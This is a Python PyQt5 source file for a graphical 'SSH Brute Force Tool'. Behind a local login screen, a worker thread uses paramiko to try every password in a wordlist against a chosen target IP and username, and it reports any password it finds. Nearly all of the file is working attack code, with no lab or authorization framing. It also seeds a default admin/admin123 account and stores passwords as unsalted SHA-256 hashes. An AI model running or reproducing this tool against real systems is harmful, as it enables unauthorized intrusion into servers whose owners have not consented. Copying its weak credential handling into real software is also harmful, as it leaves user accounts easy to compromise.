
import sys
import json
import os
import paramiko
import hashlib
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QLabel, QLineEdit, QPushButton,
    QTextEdit, QFileDialog, QVBoxLayout, QHBoxLayout, QWidget, QProgressBar,
    QMessageBox
)
from PyQt5.QtCore import QThread, pyqtSignal

USERS_FILE = "users.json"


# ---------- PASSWORD HASHING ----------
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()


# ---------- USER MANAGEMENT ----------
def load_users():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w") as f:
            json.dump(
                {"admin": hash_password("admin123")},
                f,
                indent=4
            )
    with open(USERS_FILE, "r") as f:
        return json.load(f)


def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=4)


# ---------- LOGIN WINDOW ----------
class LoginWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.users = load_users()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("User Login / Sign Up")
        self.setGeometry(500, 300, 400, 380)

        layout = QVBoxLayout()
        layout.setSpacing(15)
        layout.setContentsMargins(30, 30, 30, 30)

        self.label_user = QLabel("Username:")
        self.input_user = QLineEdit()
        self.input_user.setPlaceholderText("Enter your username")

        self.label_pass = QLabel("Password:")
        self.input_pass = QLineEdit()
        self.input_pass.setEchoMode(QLineEdit.Password)
        self.input_pass.setPlaceholderText("Enter your password")

        self.btn_login = QPushButton("Login")
        self.btn_signup = QPushButton("Sign Up")
        
        self.btn_signup.setStyleSheet("""
            QPushButton {
                background-color: #475569;
                color: white;
            }
            QPushButton:hover {
                background-color: #334155;
            }
            QPushButton:pressed {
                background-color: #1e293b;
            }
        """)

        self.btn_login.clicked.connect(self.login)
        self.btn_signup.clicked.connect(self.signup)

        layout.addWidget(self.label_user)
        layout.addWidget(self.input_user)
        layout.addWidget(self.label_pass)
        layout.addWidget(self.input_pass)
        layout.addSpacing(10)
        layout.addWidget(self.btn_login)
        layout.addWidget(self.btn_signup)

        self.setLayout(layout)
        self.setStyleSheet("""
            QWidget {
                background-color: #0f172a;
                color: #f8fafc;
                font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
                font-size: 14px;
            }
            QLabel {
                font-weight: 600;
                color: #cbd5e1;
            }
            QLineEdit {
                background-color: #1e293b;
                color: #f8fafc;
                border: 1px solid #334155;
                border-radius: 6px;
                padding: 10px;
            }
            QLineEdit:focus {
                border: 1px solid #3b82f6;
                background-color: #0f172a;
            }
            QPushButton {
                background-color: #3b82f6;
                color: white;
                border: none;
                border-radius: 6px;
                padding: 12px;
                font-weight: bold;
                font-size: 14px;
            }
            QPushButton:hover {
                background-color: #2563eb;
            }
            QPushButton:pressed {
                background-color: #1d4ed8;
            }
        """)

    def login(self):
        user = self.input_user.text()
        pwd = self.input_pass.text()
        hashed_pwd = hash_password(pwd)

        if user in self.users and self.users[user] == hashed_pwd:
            QMessageBox.information(self, "Success", "Login Successful")
            self.main = SSHBruteForceApp()
            self.main.show()
            self.close()
        else:
            QMessageBox.warning(self, "Error", "Invalid username or password")

    def signup(self):
        user = self.input_user.text()
        pwd = self.input_pass.text()

        if not user or not pwd:
            QMessageBox.warning(self, "Error", "Fields cannot be empty")
            return

        if user in self.users:
            QMessageBox.warning(self, "Error", "User already exists")
            return

        self.users[user] = hash_password(pwd)
        save_users(self.users)
        QMessageBox.information(self, "Success", "User registered successfully")


# ---------- BRUTE FORCE THREAD ----------
class BruteForceWorker(QThread):
    progress = pyqtSignal(int)
    log = pyqtSignal(str)
    finished_signal = pyqtSignal()

    def __init__(self, target_ip, username, passwords):
        super().__init__()
        self.target_ip = target_ip
        self.username = username
        self.passwords = passwords
        self.is_running = True

    def run(self):
        total = len(self.passwords)
        try:
            for i, password in enumerate(self.passwords):
                if not self.is_running:
                    self.log.emit("[STOPPED] Attack stopped by user.")
                    break

                password = password.strip()
                if not password:
                    continue

                # Parse optional port from target_ip
                host = self.target_ip
                port = 22
                if ":" in host:
                    try:
                        host, port_str = host.split(":")
                        port = int(port_str)
                    except ValueError:
                        pass

                try:
                    self.log.emit(f"[Attempt] {password}")
                    
                    # Create a fresh client for every attempt to avoid socket corruption
                    with paramiko.SSHClient() as client:
                        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        client.connect(
                            hostname=host,
                            port=port,
                            username=self.username,
                            password=password,
                            timeout=10,
                            banner_timeout=20,
                            auth_timeout=20,
                            look_for_keys=False,
                            allow_agent=False
                        )
                        self.log.emit(f"[SUCCESS] Password Found: {password}")
                        self.progress.emit(100)
                        self.finished_signal.emit()
                        return
                except paramiko.AuthenticationException:
                    self.log.emit("[FAILED] Incorrect password.")
                except Exception as e:
                    self.log.emit(f"[ERROR] Connection failed: {str(e)}")
                    # Do not break, allow the attack to continue if the user wishes

                self.progress.emit(int((i + 1) / total * 100))
        except Exception as e:
            self.log.emit(f"[FATAL ERROR] {str(e)}")
        finally:
            self.finished_signal.emit()

    def stop(self):
        self.is_running = False


# ---------- MAIN APPLICATION ----------
class SSHBruteForceApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("SSH Brute Force Tool")
        self.setGeometry(400, 400, 800, 650)

        layout = QVBoxLayout()
        layout.setSpacing(12)
        layout.setContentsMargins(30, 30, 30, 30)

        self.input_ip = QLineEdit()
        self.input_ip.setPlaceholderText("e.g. 192.168.1.100")
        
        self.input_user = QLineEdit()
        self.input_user.setPlaceholderText("e.g. root")
        
        self.input_file = QLineEdit()
        self.input_file.setPlaceholderText("Select or enter path to passwords file")

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setPlaceholderText("Activity logs will appear here...")

        self.progress = QProgressBar()
        self.progress.setValue(0)

        btn_browse = QPushButton("Browse")
        btn_browse.setStyleSheet("""
            QPushButton {
                background-color: #475569;
                color: white;
                padding: 10px;
                border-radius: 6px;
            }
            QPushButton:hover { background-color: #334155; }
            QPushButton:pressed { background-color: #1e293b; }
        """)
        
        self.btn_start = QPushButton("Start Attack")
        self.btn_start.setStyleSheet("""
            QPushButton {
                background-color: #ef4444;
                color: white;
                font-size: 16px;
                padding: 12px;
                border-radius: 6px;
            }
            QPushButton:hover { background-color: #dc2626; }
            QPushButton:pressed { background-color: #b91c1c; }
            QPushButton:disabled { background-color: #7f1d1d; color: #f8fafc; }
        """)

        self.btn_stop = QPushButton("Stop Attack")
        self.btn_stop.setStyleSheet("""
            QPushButton {
                background-color: #f59e0b;
                color: white;
                font-size: 16px;
                padding: 12px;
                border-radius: 6px;
            }
            QPushButton:hover { background-color: #d97706; }
            QPushButton:pressed { background-color: #b45309; }
            QPushButton:disabled { background-color: #78350f; color: #f8fafc; }
        """)
        self.btn_stop.setEnabled(False)

        btn_browse.clicked.connect(self.browse)
        self.btn_start.clicked.connect(self.start_attack)
        self.btn_stop.clicked.connect(self.stop_attack)

        layout.addWidget(QLabel("Target IP:"))
        layout.addWidget(self.input_ip)
        layout.addWidget(QLabel("Username:"))
        layout.addWidget(self.input_user)
        
        file_layout = QHBoxLayout()
        file_layout.addWidget(self.input_file)
        file_layout.addWidget(btn_browse)
        
        layout.addWidget(QLabel("Password File:"))
        layout.addLayout(file_layout)
        
        layout.addSpacing(10)
        layout.addWidget(QLabel("Logs:"))
        layout.addWidget(self.log_box)
        layout.addWidget(self.progress)
        layout.addSpacing(10)
        
        button_layout = QHBoxLayout()
        button_layout.addWidget(self.btn_start)
        button_layout.addWidget(self.btn_stop)
        layout.addLayout(button_layout)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)
        self.setStyleSheet("""
            QWidget {
                background-color: #0f172a;
                color: #f8fafc;
                font-family: 'Segoe UI', 'Helvetica Neue', sans-serif;
                font-size: 14px;
            }
            QLabel {
                font-weight: 600;
                color: #cbd5e1;
            }
            QLineEdit, QTextEdit {
                background-color: #1e293b;
                color: #f8fafc;
                border: 1px solid #334155;
                border-radius: 6px;
                padding: 10px;
            }
            QLineEdit:focus, QTextEdit:focus {
                border: 1px solid #3b82f6;
                background-color: #0f172a;
            }
            QPushButton {
                background-color: #3b82f6;
                color: white;
                border: none;
                border-radius: 6px;
                font-weight: bold;
            }
            QProgressBar {
                border: 1px solid #334155;
                border-radius: 6px;
                text-align: center;
                color: white;
                background-color: #1e293b;
                font-weight: bold;
                min-height: 24px;
            }
            QProgressBar::chunk {
                background-color: #10b981;
                border-radius: 5px;
            }
        """)

    def browse(self):
        file, _ = QFileDialog.getOpenFileName(self, "Select File")
        if file:
            self.input_file.setText(file)

    def start_attack(self):
        try:
            with open(self.input_file.text(), "r") as f:
                passwords = f.readlines()
        except:
            self.log_box.append("Invalid password file")
            return

        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.progress.setValue(0)
        self.log_box.clear()
        self.log_box.append("Starting attack...")

        self.worker = BruteForceWorker(
            self.input_ip.text(),
            self.input_user.text(),
            passwords
        )
        self.worker.log.connect(self.log_box.append)
        self.worker.progress.connect(self.progress.setValue)
        self.worker.finished_signal.connect(self.attack_finished)
        self.worker.start()

    def stop_attack(self):
        if hasattr(self, 'worker') and self.worker.isRunning():
            self.worker.stop()
            self.btn_stop.setEnabled(False)
            self.log_box.append("Stopping attack, waiting for current connection to timeout...")

    def attack_finished(self):
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)


# ---------- MAIN ----------
if __name__ == "__main__":
    app = QApplication(sys.argv)
    login = LoginWindow()
    login.show()
    sys.exit(app.exec_())

        

        

   